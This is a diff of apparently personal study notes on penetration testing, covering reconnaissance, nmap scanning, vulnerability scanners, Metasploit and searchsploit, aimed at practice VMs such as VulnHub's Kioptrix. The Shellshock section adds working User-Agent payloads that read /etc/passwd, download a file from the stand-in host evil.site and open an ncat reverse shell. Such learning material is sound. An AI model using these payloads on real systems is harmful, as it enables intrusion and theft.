@@ -222,7 +222,7 @@ Running a module to gather info regarding a specific website- or in other words 
 
 After switching to root and then running `recon-ng` and once you see [recon-ng][default] at the terminal, run the following commands in sequence
 
--`modules load hackertarget`
+- `modules load hackertarget`
 - `show options` to see if any website has been set as source already
 - `options set SOURCE tesla.com` this should change the terminal to [recon-ng][default][hackertarget]
 - `info` It shows that the source has now been set to tesla
@@ -232,31 +232,33 @@ After switching to root and then running `recon-ng` and once you see [recon-ng][
 
 
 
-- Generating a report using **reporting/html**
-- `marketplace install reporting/html` - Note that you should be in the default directory of recon-ng which you can get to by typing `back` first.
+- Generating a report using **reporting/html** Note that  this report will be based on whatever information was gathered for website previously set in source
+- `marketplace install reporting/html` or `marketplace search html` - Note that you should be in the default directory of recon-ng which you can get to by typing `back` first.
 - `marketplace search reporting/html` to check if this has been installed
 - `modules load reporting/html` to load and `info` to look at the details. Note that you must set the creator and attacker
 - `options set CREATOR attacker`
 - `options set CUSTOMER Darkweb` and type `info`
 - `run` will create the report. It will print the address where the report is located- you just have to copy it after `xdg-open`
-- `xdg-open /root/.recon-ng/workspaces/default/results.html` to open the report - note that this is a normal linux command to open file. You will have to `exit` and then type this command for it to work
+- `xdg-open /root/.recon-ng/workspaces/default/results.html` to open the report - note that this is a normal linux command to open file. You will have to `exit` to get out of `reporting/html` program and then type this command for it to work
 
 
 
 
 
 
-## Scanning and enumeration
+## Scanning and enumeration - Gathering info about open ports etc
 
 - Note that Metasploit also has some modules for enumeration and they are called **Auxiliary modules** i-e if I choose to use metasploit
 
 www.vulnhub.com. VULNHUB - you can download a vulnerable virtual machine and then load it into VMware and then practice attacking - has various levels of vulnerable machines
 kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
 - Finding actively running machines and their ip addresses. `ifconfig`  then `netdiscover -r <ip address with subnet>`
-`SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection, but then not establishing one. 
-- Modification: SYN SYNACK RST - this specification is a trick to reveal port, but not establishing a connection. This is also called a `half-connect scan`
-**nmap** Simply typing nmap in kali will tell you about the various commands you can use along with it
-`nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example -p 80,443. -A tell me everything (OS detection, version detection, script scanning and trace route). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
+`SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection by sending RST in the packet instead of ACK, this gathers info w/o establishing a connection. 
+- Modification: `SYN SYNACK RST` - this specification is a trick to reveal port, but not establishing a connection. This is also called a `half-connect scan`
+
+- **nmap** Simply typing nmap in kali will tell you about the various commands you can use along with it
+
+`nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports- i-e it will run to check all possible ports to see which one is open, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example `-p 80,443`. `-A` tell me everything (**OS detection, version detection, script scanning and trace route**). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
 - Note that -A is the real speed killer here as it is checking for all the versions
 `nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
 nmap can be used for script scaning, OS detection - other options: version detection, script scanning and trace route if I select -A - it will do all these functions, but is slow. We can also specify the ports. 
@@ -264,7 +266,7 @@ nmap can be used for script scaning, OS detection - other options: version detec
 
 - Other useful options include 
 -`-pn` will not ping- making the scan faster, 
--`-sT` allows TCP full connect scan whcih is noisy and detectable- most hackers do not use it
+-`-sT` allows TCP full connect scan which is noisy and detectable- most hackers do not use it
 - `-sV` probes for service and version info.
 - `-sC` returns the default scripted scan- more results
 - `-oN` outputs results in a text file
@@ -301,7 +303,7 @@ nmap can be used for script scaning, OS detection - other options: version detec
 **Other methods of scanning**
 - One method is shown above
 - massscan
-- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1-65535 <ip address>`
+- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1 -65535 <ip address>`
 
 - **Things to look for when you have run the scan**
   - Ping scans
@@ -312,17 +314,21 @@ nmap can be used for script scaning, OS detection - other options: version detec
    - Outputting scan results to files
 - Look for open ports
 - anonymous FTP allowed?
-- versions for exploitation such as SAMBA - SMB is a network protocol that lets remote computers to connect with servers
+- versions for exploitation such as `SAMBA - SMB` is a network protocol that lets remote computers to connect with servers
 - If SSH is open then if you attack it then the company should be able to detect it, attacking SSH makes you noisy. If the blue team of the company is unable to detect then their defences are likely very weak
 - OS guesses, may not be accurate initially- you can confirm this after you are able to gain access
 - There can be some default webpages for sub-domins- these indicate an opening for a hidden directory maybe for a sub-domain that could be exploited with `drbuster`, `gobuster` etc
 
 
 
-**Nmap Scripting Engine NSE**
+**Nmap Scripting Engine NSE** - Comes after an initial scan has been successfully run
+- NSE allows creation of custom Nmap scripts for individual needs
+
+- It cannot perform a large number of scans simultaneously and it is not very comprehensive - can miss vulnerabilities
 
 - These are scripts that are run on the results of the initial scan to search the web for what exploits are available
-- This is a preinatalled collection of scripts that come with Nmap, about 600
+
+- This is a preinstalled collection of scripts that come with Nmap, about 600
 - `ls /usr/share/nmap/scripts` to display the current scripts
 - Most scripts are for infomation gathering, but some can be used for automating networking tasks
  - DNS enumeration
@@ -342,7 +348,7 @@ nmap can be used for script scaning, OS detection - other options: version detec
 **Nessus/ Vulnerability scans**
 - NSE scan is weaker than a vulnerability scan. An example of vulnerability scan includes Nessus
 
-- these scan the network using a known database of vulnerabilities **National Vulnerability Databse (NBV)** [NVB](nvd.nist.gov), whcih are rated based on the severity and are assigned a common vulnerability score (CVSS) and catwgory (low, medium, high, critical) of severity based on the score. 
+- these scan the network using a known database of vulnerabilities **National Vulnerability Databse (NBV)** [NVB](nvd.nist.gov), which are rated based on the severity to vulnerability and are assigned a common vulnerability score (CVSS) and category (low, medium, high, critical) of severity based on the score. 
 
 Critical: 10.0.
 High: 7.0 - 9.9.
@@ -366,7 +372,7 @@ but its such a hassal to install- not worth trying- so I am going to pass. The b
 - `alien zenmap-7.80-1.noarch.rpm` convert to deb file from rpm before it can be used
 - `dpkg -i zenmap_7.80-2_all.deb` this will install zenmap after download
 
-- apt list --installed | grep alien to check if it is installed
+- `apt list --installed | grep alien` to check if it is installed
 - 
 
 **Drbuster**
@@ -383,8 +389,14 @@ but its such a hassal to install- not worth trying- so I am going to pass. The b
 Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - SMB. SMB is a file share. Manages uploading, DL files or sharing files with co-workers. It is important to know what type of SMB version is being used
-- **Metasploit**- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
-   ` Rhosts `- target address, `set RHOSTS 192.168.57.139`and then `run` This refers fo remote hosts, hosts are the individual machines in the network
+
+
+- **Metasploit**
+
+- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
+
+   ` Rhosts `- target address, `set RHOSTS 192.168.57.139`and then `run` This refers to remote hosts, hosts are the individual machines in the network
+
     `Lhosts` - this is the listening host
 - **Smbclient** - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal
 
@@ -398,7 +410,42 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 
 ## Exploitation
-- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to break into target)
+
+
+**Search Sploit**
+- It is a query to find the scripts or payloads available for a given vulnerability
+- `Exploit-DB`
+- It relies on a database called Exploit-Db
+- Exploit-Db is a built-in repository inside Kali-Linux that contains information regarding the publically disclosed exploits based on their `common vulnerability exposure identifier (CVE)`
+
+- In kali linux this repository is already installed, so you can use it even if you are not connected to the internet. But this repository should be updated weeky
+
+- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline and perform searches offline- it syncs the local repo with the remote repo. Other useful command adjuncts: `-c`(case sensitive), `-e`(exact match), `j`(JSON format), `p`(full path to a file), `t`( search in title), `w`(will provide website in the results)
+
+- `searchsploit ftp remote file | wc -l` this will search the database for the words ftp, remote and file. `| wc -l` returns the number of exploits in the search
+
+- `searchsploit linux kernel 4.4 --exclude="(PoC)|/DCCP/"` - can also use to exclude whaever is in ""
+
+- `searchsploit mysql 6.0 -w` `-w` provides the website in results
+
+- Exploit scripts or **payload scripts**
+    - .rb are scripts written in Ruby.
+    - .py in Python.
+    - .sh in Bash.
+    - .html in HTML.
+    - .txt in a text editor.
+
+
+- `searchsploit shellshock` will show all the shellshock scripts
+
+
+- So far I have only run scans. Gathered Ips and related info on vulnerabilities. Once I have this info now is the time to search for the exploits for these vulnerabilities. 
+
+- This is typically done using `searchsploit` and typing the name of vulnerability to find the payload script
+
+- Then `ncat` is used to establish connection
+
+- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to run scripts on the victim machine)
 
 - Note the difference: Metasploit is run on the hacker's machine, and Meterpreter is run on the victim machine after exploitation is successful. An alternative to Meterpreter are the various payloads available for specific vulnerabilities. I can also create custom payload modules in metasploit
 
@@ -413,7 +460,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - Shell shock is a software that allows you to execute bash script code on a remote server. This is done by exploiting **common gateway interface** which is a protocol that handles requests for running scripts on the server. 
 
-- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables into the HTTP header- which can potentially elevate priviliges and allow:
+- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables (controls how processes are run on a computer) into the HTTP header- which can potentially elevate priviliges and allow:
 
     - Download of sensitive data
     - Send and receive shells to and from the target
@@ -465,35 +512,24 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - `User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'`
 
+- Other manipulation examples
+1. Read `/etc/passwd`.
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'`
+
+2. Use `curl` to download a malicious file from `http://evil.site/mal.php`.
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'`
+
+3. Open a netcat/ncat listener on your host's port `4444`. 
+   - Solution: `ncat -lvp 4444`
+
+4. Send a reverse shell to your port 4444 (in this example, use the IP address `192.168.0.8`). 
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'`
+
 
 - But before this command can be run, a listening port must be open on the host
 
 - `ncat -lvp 4444`
 
-
-**Search Sploit**
-
-- `Exploit-DB`
-- It relies on a database called Exploit-Db
-- Exploit-Db is a built-in repository inside Kali-Linux that contains information regarding the publically disclosed exploits based on their `common vulnerability exposure identifier (CVE)`
-
-- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline and perform searches offline. Other useful command adjuncts: `-c`(case sensitive), `-e`(exact match), `j`(JSON format), `p`(full path to a file), `t`( search in title), `w`(will provide website in the results)
-
-- `searchsploit ftp remote file | wc -l` this will search the database for the words ftp, remote and file
-
-- `searchsploit linux kernel 4.4 --exclude="(PoC)|/DCCP/"` - can also use to exclude whaever is in ""
-
-- `searchsploit mysql 6.0 -w`
-
-- Exploit scripts or **payload scripts**
-    - .rb are scripts written in Ruby.
-    - .py in Python.
-    - .sh in Bash.
-    - .html in HTML.
-    - .txt in a text editor.
-
-
-- `searchsploit shellshock` will show all the shellshock scripts
 
 
 **Payload**
